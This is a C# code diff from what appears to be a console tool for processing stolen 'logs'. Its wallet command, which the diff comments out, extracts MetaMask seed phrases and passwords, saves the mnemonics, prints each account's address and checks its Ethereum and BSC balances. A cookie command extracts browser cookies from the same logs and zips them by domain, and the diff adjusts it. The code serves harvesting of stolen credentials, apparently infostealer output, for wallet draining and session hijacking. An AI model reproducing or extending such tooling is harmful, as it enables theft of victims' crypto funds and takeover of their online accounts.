@@ -5,44 +5,45 @@ using Console.Models.Views;
 using Core.Models.Configs;
 using Core.Parsers;
 using Core.Wallets;
+using Splat;
 
 namespace Console.Views;
 
-public class MainView(IRoot root, Settings settings, DataService data, Web3Config cfgWeb3, ParsingConfig cfgParse)
+public class MainView(IRoot root, Settings settings, DataService data, ParsingConfig cfgParse)
     : ArgsView(root)
 {
     [Command, Redirect]
     public Task Services() => Task.Run(() => Root.PushRedirect<ServicesView>());
     
     // [Command]
-    public async Task Wallets()
-    {
-        var checker = new MetamaskChecker(cfgWeb3.Eth, cfgWeb3.Bsc);
-        var wallets = new MetamaskParser().ByLogs(settings.Path);
-
-        await data.SaveAsync("mnemonics", wallets.Select(x => x?.Mnemonic).Distinct());
-        
-        foreach (var wallet in wallets)
-        {
-            if (wallet is not {Mnemonic:not null, Password:not null} ||
-                wallet.Mnemonic.Split(' ').Length != 12) continue;
-            
-            System.Console.WriteLine(wallet.Mnemonic);
-            
-            foreach (var account in wallet.Accounts.Values.OrderBy(x => x.Name))
-            {
-                System.Console.WriteLine(account.Name);
-                System.Console.WriteLine(account.Address);
-                
-                foreach (var balance in await checker.Balance(account.Address))
-                {
-                    System.Console.WriteLine($"{balance.Key}: {balance.Value}");
-                }
-            }
-        }
-
-        _ExitWait();
-    }
+    //public async Task Wallets()
+    //{
+    //    var checker = new MetamaskChecker(cfgWeb3.Eth, cfgWeb3.Bsc);
+    //    var wallets = new MetamaskParser().ByLogs(settings.Path);
+    //
+    //    await data.SaveAsync("mnemonics", wallets.Select(x => x?.Mnemonic).Distinct());
+    //    
+    //    foreach (var wallet in wallets)
+    //    {
+    //        if (wallet is not {Mnemonic:not null, Password:not null} ||
+    //            wallet.Mnemonic.Split(' ').Length != 12) continue;
+    //        
+    //        System.Console.WriteLine(wallet.Mnemonic);
+    //        
+    //        foreach (var account in wallet.Accounts.Values.OrderBy(x => x.Name))
+    //        {
+    //            System.Console.WriteLine(account.Name);
+    //            System.Console.WriteLine(account.Address);
+    //            
+    //            foreach (var balance in await checker.Balance(account.Address))
+    //            {
+    //                System.Console.WriteLine($"{balance.Key}: {balance.Value}");
+    //            }
+    //        }
+    //    }
+    //
+    //    _ExitWait();
+    //}
 
     [Command]
     public async Task Links()
@@ -57,9 +58,9 @@ public class MainView(IRoot root, Settings settings, DataService data, Web3Confi
     {
         var result = cfgParse.Cookies.CookiesFromLogs(settings.Path);
         
-        foreach (var (domain, cookies) in result)
+        foreach (var (cookie, cookies) in result)
         {
-            await data.SaveZipAsync("cookies", domain, cookies.ToArray());
+            await data.SaveZipAsync("cookies", cookie.Domains.First(), cookies.ToArray(), cookie.OneFile);
         }
 
         _ExitWait();
